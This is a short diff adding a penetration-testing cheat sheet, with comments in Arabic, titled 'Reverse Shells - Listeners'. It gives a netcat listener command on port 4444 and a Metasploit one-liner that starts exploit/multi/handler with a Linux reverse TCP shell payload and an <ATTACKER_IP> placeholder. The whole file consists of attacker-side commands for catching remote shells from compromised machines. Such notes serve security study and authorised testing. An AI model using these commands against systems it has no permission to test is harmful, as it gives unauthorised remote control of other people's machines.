@@ -1,0 +1,9 @@
+# Reverse Shells - Listeners
+
+## Linux (Netcat)
+nc -lvnp 4444
+# استمع على بورت (مثلاً 4444)
+
+## Metasploit
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 4444; run"
+# استماع باستخدام Metasploit
